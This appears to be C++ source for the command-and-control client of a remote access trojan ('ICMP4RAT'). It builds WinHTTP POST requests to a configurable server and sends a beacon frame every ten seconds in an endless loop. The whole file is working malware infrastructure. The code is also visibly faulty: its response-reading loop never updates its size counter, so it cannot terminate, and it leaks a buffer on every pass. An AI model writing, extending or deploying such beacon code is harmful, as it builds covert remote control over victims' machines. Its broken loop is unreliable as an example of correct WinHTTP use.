#include <iostream>
#include "cncManager.h"

cncManager::cncManager() {
	/* HTTP Initialize */
	this->hSession = WinHttpOpen(L"ICMP4RAT", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

	if (this->hSession)
		this->hConnect = WinHttpConnect(this->hSession, this->server, INTERNET_DEFAULT_HTTP_PORT, 0);

	if (this->hConnect)
		this->hRequest = WinHttpOpenRequest(this->hConnect, L"POST", this->index, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

}

cncManager::cncManager(LPCWSTR server) {
	this->server = server;
	/* HTTP Initialize */
	this->hSession = WinHttpOpen(L"ICMP4RAT", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);

	if (this->hSession)
		this->hConnect = WinHttpConnect(this->hSession, this->server, INTERNET_DEFAULT_HTTP_PORT, 0);

	if (this->hConnect)
		this->hRequest = WinHttpOpenRequest(this->hConnect, L"POST", this->index, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

}

void cncManager::sendHttpRequest(LPVOID data, DWORD dlen) {

	if (hRequest)
		bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, data, dlen, dlen, 0);

	if (this->bResults)
		this->bResults = WinHttpReceiveResponse(this->hRequest, NULL);


	if (!this->bResults)
		std::cout << "Error" << GetLastError() << "has occurred." << std::endl;

	if (this->bResults)
		for (DWORD dwSize = 1; dwSize > 0;)
		{

			LPSTR pszOutBuffer = new char[dwSize + 1];
			if (!pszOutBuffer)
			{
				dwSize = 0;
			}
			else
			{
				ZeroMemory(pszOutBuffer, dwSize + 1);

				DWORD dwDownloaded = 0;
				WinHttpReadData(this->hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded);
				std::wcout << pszOutBuffer;
			}
		}
}

void cncManager::sendBeacon() {
	DDprotocol* beaconFrame = new DDprotocol;
	beaconFrame->type = beaconRequest;
	beaconFrame->len = 0;
	beaconFrame->seq = 0;

	while (TRUE) {
		this->sendHttpRequest((LPVOID)beaconFrame, sizeof(DDprotocol));
		//std::cout << "sss";
		Sleep(10000);
	}
}

cncManager::~cncManager() {
	/* Delete Http Handle */
	if (this->hRequest) WinHttpCloseHandle(this->hRequest);
	if (this->hConnect) WinHttpCloseHandle(this->hConnect);
	if (this->hSession) WinHttpCloseHandle(this->hSession);
}

int main() {
	cncManager client;
	DDprotocol* dd = new DDprotocol;
	dd->type = beaconRequest;
	dd->len = 123;
	dd->seq = 123;
	client.sendHttpRequest((LPVOID)dd,sizeof(DDprotocol));
	//client.sendBeacon();

	delete dd;
}
